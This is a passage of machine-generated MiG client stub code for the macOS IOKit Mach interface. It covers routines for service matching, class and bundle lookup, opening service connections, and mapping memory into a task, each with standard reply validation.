	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2858, "io_service_match_property_table_ool")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_service_match_property_table_ool_t__defined)
	check_result = __MIG_check__Reply__io_service_match_property_table_ool_t((__Reply__io_service_match_property_table_ool_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_service_match_property_table_ool_t__defined) */

	*result = Out0P->result;

	*matches = Out0P->matches;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_object_get_superclass_t__defined)
#define __MIG_check__Reply__io_object_get_superclass_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_object_get_superclass_t(__Reply__io_object_get_superclass_t *Out0P)
{

	typedef __Reply__io_object_get_superclass_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */

	if (Out0P->Head.msgh_id != 2960) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size > (mach_msg_size_t)sizeof(__Reply) || msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 128)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if ( Out0P->class_nameCnt > 128 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 128))< Out0P->class_nameCnt) ||
	    (msgh_size != (mach_msg_size_t)(sizeof(__Reply) - 128) + _WALIGN_(Out0P->class_nameCnt)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_object_get_superclass_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_object_get_superclass */
mig_external kern_return_t io_object_get_superclass
(
	mach_port_t master_port,
	io_name_t obj_name,
	io_name_t class_name
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t obj_nameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t obj_nameCnt;
		char obj_name[128];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t class_nameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t class_nameCnt;
		char class_name[128];
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t class_nameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t class_nameCnt;
		char class_name[128];
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;

#ifdef	__MIG_check__Reply__io_object_get_superclass_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_object_get_superclass_t__defined */

	__DeclareSendRpc(2860, "io_object_get_superclass")

	InP->NDR = NDR_record;

#ifdef USING_MIG_STRNCPY_ZEROFILL
	if (mig_strncpy_zerofill != NULL) {
		InP->obj_nameCnt = (mach_msg_type_number_t) mig_strncpy_zerofill(InP->obj_name, obj_name, 128);
	} else {
#endif /* USING_MIG_STRNCPY_ZEROFILL */
		InP->obj_nameCnt = (mach_msg_type_number_t) mig_strncpy(InP->obj_name, obj_name, 128);
#ifdef USING_MIG_STRNCPY_ZEROFILL
	}
#endif /* USING_MIG_STRNCPY_ZEROFILL */
	InP->obj_nameOffset = 0;

	msgh_size = (mach_msg_size_t)(sizeof(Request) - 128) + (_WALIGN_(InP->obj_nameCnt));
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = master_port;
	InP->Head.msgh_id = 2860;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2860, "io_object_get_superclass")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2860, "io_object_get_superclass")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_object_get_superclass_t__defined)
	check_result = __MIG_check__Reply__io_object_get_superclass_t((__Reply__io_object_get_superclass_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_object_get_superclass_t__defined) */

	(void) mig_strncpy(class_name, Out0P->class_name, 128);

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_object_get_bundle_identifier_t__defined)
#define __MIG_check__Reply__io_object_get_bundle_identifier_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_object_get_bundle_identifier_t(__Reply__io_object_get_bundle_identifier_t *Out0P)
{

	typedef __Reply__io_object_get_bundle_identifier_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */

	if (Out0P->Head.msgh_id != 2961) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size > (mach_msg_size_t)sizeof(__Reply) || msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 128)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if ( Out0P->class_nameCnt > 128 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 128))< Out0P->class_nameCnt) ||
	    (msgh_size != (mach_msg_size_t)(sizeof(__Reply) - 128) + _WALIGN_(Out0P->class_nameCnt)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_object_get_bundle_identifier_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_object_get_bundle_identifier */
mig_external kern_return_t io_object_get_bundle_identifier
(
	mach_port_t master_port,
	io_name_t obj_name,
	io_name_t class_name
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t obj_nameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t obj_nameCnt;
		char obj_name[128];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t class_nameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t class_nameCnt;
		char class_name[128];
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t class_nameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t class_nameCnt;
		char class_name[128];
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;

#ifdef	__MIG_check__Reply__io_object_get_bundle_identifier_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_object_get_bundle_identifier_t__defined */

	__DeclareSendRpc(2861, "io_object_get_bundle_identifier")

	InP->NDR = NDR_record;

#ifdef USING_MIG_STRNCPY_ZEROFILL
	if (mig_strncpy_zerofill != NULL) {
		InP->obj_nameCnt = (mach_msg_type_number_t) mig_strncpy_zerofill(InP->obj_name, obj_name, 128);
	} else {
#endif /* USING_MIG_STRNCPY_ZEROFILL */
		InP->obj_nameCnt = (mach_msg_type_number_t) mig_strncpy(InP->obj_name, obj_name, 128);
#ifdef USING_MIG_STRNCPY_ZEROFILL
	}
#endif /* USING_MIG_STRNCPY_ZEROFILL */
	InP->obj_nameOffset = 0;

	msgh_size = (mach_msg_size_t)(sizeof(Request) - 128) + (_WALIGN_(InP->obj_nameCnt));
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = master_port;
	InP->Head.msgh_id = 2861;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2861, "io_object_get_bundle_identifier")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2861, "io_object_get_bundle_identifier")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_object_get_bundle_identifier_t__defined)
	check_result = __MIG_check__Reply__io_object_get_bundle_identifier_t((__Reply__io_object_get_bundle_identifier_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_object_get_bundle_identifier_t__defined) */

	(void) mig_strncpy(class_name, Out0P->class_name, 128);

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_service_open_extended_t__defined)
#define __MIG_check__Reply__io_service_open_extended_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_service_open_extended_t(__Reply__io_service_open_extended_t *Out0P)
{

	typedef __Reply__io_service_open_extended_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2962) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->connection.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->connection.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_service_open_extended_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_service_open_extended */
mig_external kern_return_t io_service_open_extended
(
	mach_port_t service,
	task_t owningTask,
	uint32_t connect_type,
	NDR_record_t ndr,
	io_buf_ptr_t properties,
	mach_msg_type_number_t propertiesCnt,
	kern_return_t *result,
	mach_port_t *connection
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t owningTask;
		mach_msg_ool_descriptor_t properties;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		uint32_t connect_type;
		NDR_record_t ndr;
		mach_msg_type_number_t propertiesCnt;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t connection;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		kern_return_t result;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t connection;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		kern_return_t result;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_service_open_extended_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_service_open_extended_t__defined */

	__DeclareSendRpc(2862, "io_service_open_extended")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t owningTaskTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		19,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

#if	UseStaticTemplates
	const static mach_msg_ool_descriptor_t propertiesTemplate = {
		/* addr = */		(void *)0,
		/* size = */		0,
		/* deal = */		FALSE,
		/* copy = */		MACH_MSG_PHYSICAL_COPY,
		/* pad2 = */		0,
		/* type = */		MACH_MSG_OOL_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 2;
#if	UseStaticTemplates
	InP->owningTask = owningTaskTemplate;
	InP->owningTask.name = owningTask;
#else	/* UseStaticTemplates */
	InP->owningTask.name = owningTask;
	InP->owningTask.disposition = 19;
	InP->owningTask.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

#if	UseStaticTemplates
	InP->properties = propertiesTemplate;
	InP->properties.address = (void *)(properties);
	InP->properties.size = propertiesCnt;
#else	/* UseStaticTemplates */
	InP->properties.address = (void *)(properties);
	InP->properties.size = propertiesCnt;
	InP->properties.deallocate =  FALSE;
	InP->properties.copy = MACH_MSG_PHYSICAL_COPY;
	InP->properties.type = MACH_MSG_OOL_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

	InP->connect_type = connect_type;

	InP->ndr = ndr;

	InP->propertiesCnt = propertiesCnt;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = service;
	InP->Head.msgh_id = 2862;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2862, "io_service_open_extended")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2862, "io_service_open_extended")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_service_open_extended_t__defined)
	check_result = __MIG_check__Reply__io_service_open_extended_t((__Reply__io_service_open_extended_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_service_open_extended_t__defined) */

	*result = Out0P->result;

	*connection = Out0P->connection.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_connect_map_memory_into_task_t__defined)
#define __MIG_check__Reply__io_connect_map_memory_into_task_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_connect_map_memory_into_task_t(__Reply__io_connect_map_memory_into_task_t *Out0P)
{

	typedef __Reply__io_connect_map_memory_into_task_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2963) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_connect_map_memory_into_task_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_connect_map_memory_into_task */
mig_external kern_return_t io_connect_map_memory_into_task
(
	mach_port_t connection,
	uint32_t memory_type,
	task_t into_task,
	mach_vm_address_t *address,
	mach_vm_size_t *size,
	uint32_t flags
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t into_task;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		uint32_t memory_type;
		mach_vm_address_t address;
		mach_vm_size_t size;
		uint32_t flags;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_vm_address_t address;
		mach_vm_size_t size;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_vm_address_t address;
		mach_vm_size_t size;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_connect_map_memory_into_task_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_connect_map_memory_into_task_t__defined */

	__DeclareSendRpc(2863, "io_connect_map_memory_into_task")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t into_taskTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		19,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->into_task = into_taskTemplate;
	InP->into_task.name = into_task;
#else	/* UseStaticTemplates */
	InP->into_task.name = into_task;
	InP->into_task.disposition = 19;
	InP->into_task.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

	InP->memory_type = memory_type;

	InP->address = *address;

	InP->size = *size;

	InP->flags = flags;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = connection;
	InP->Head.msgh_id = 2863;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2863, "io_connect_map_memory_into_task")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2863, "io_connect_map_memory_into_task")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_connect_map_memory_into_task_t__defined)
	check_result = __MIG_check__Reply__io_connect_map_memory_into_task_t((__Reply__io_connect_map_memory_into_task_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_connect_map_memory_into_task_t__defined) */

	*address = Out0P->address;

	*size = Out0P->size;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_connect_unmap_memory_from_task_t__defined)
#define __MIG_check__Reply__io_connect_unmap_memory_from_task_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_connect_unmap_memory_from_task_t(__Reply__io_connect_unmap_memory_from_task_t *Out0P)
{

	typedef __Reply__io_connect_unmap_memory_from_task_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 2964) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__io_connect_unmap_memory_from_task_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_connect_unmap_memory_from_task */
mig_external kern_return_t io_connect_unmap_memory_from_task
(
	mach_port_t connection,
	uint32_t memory_type,
	task_t from_task,
	mach_vm_address_t address
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t from_task;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		uint32_t memory_type;
		mach_vm_address_t address;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_connect_unmap_memory_from_task_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_connect_unmap_memory_from_task_t__defined */

	__DeclareSendRpc(2864, "io_connect_unmap_memory_from_task")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t from_taskTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		19,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->from_task = from_taskTemplate;
	InP->from_task.name = from_task;
#else	/* UseStaticTemplates */
